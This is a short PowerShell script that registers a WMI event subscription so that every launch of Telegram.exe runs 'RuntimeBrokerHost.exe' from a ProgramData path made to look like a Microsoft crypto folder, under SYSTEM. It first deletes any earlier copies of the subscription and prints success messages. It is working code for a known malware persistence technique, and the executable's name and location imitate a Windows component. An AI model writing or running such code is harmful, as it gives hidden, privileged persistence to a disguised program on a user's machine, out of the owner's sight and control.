# Registers kernel-level trigger: Every time Telegram.exe starts, Windows launches RuntimeBrokerHost
try {
    $targetPath = "C:\ProgramData\Microsoft\Crypto\SystemBroker\RuntimeBrokerHost.exe"
    
    # 1. Clean existing
    Get-CimInstance -Namespace root\subscription -ClassName __EventFilter -Filter "Name='TelegramTriggerFilter'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
    Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter "Name='TelegramTriggerConsumer'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue

    # 2. Event Filter: Fires on Telegram.exe process start
    $filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property @{
        Name = 'TelegramTriggerFilter'
        EventNamespace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'Telegram.exe'"
    }

    # 3. Consumer: Launches the guard under SYSTEM
    $consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property @{
        Name = 'TelegramTriggerConsumer'
        CommandLineTemplate = $targetPath
    }

    # 4. Bind Filter to Consumer
    New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property @{
        Filter = [Microsoft.Management.Infrastructure.CimInstance]$filter
        Consumer = [Microsoft.Management.Infrastructure.CimInstance]$consumer
    } | Out-Null

    Write-Host "[+] WMI Kernel Trigger Registered: Telegram.exe start will automatically launch RuntimeBrokerHost."
} catch {
    Write-Host "[-] WMI Registration: $($_.Exception.Message)"
}

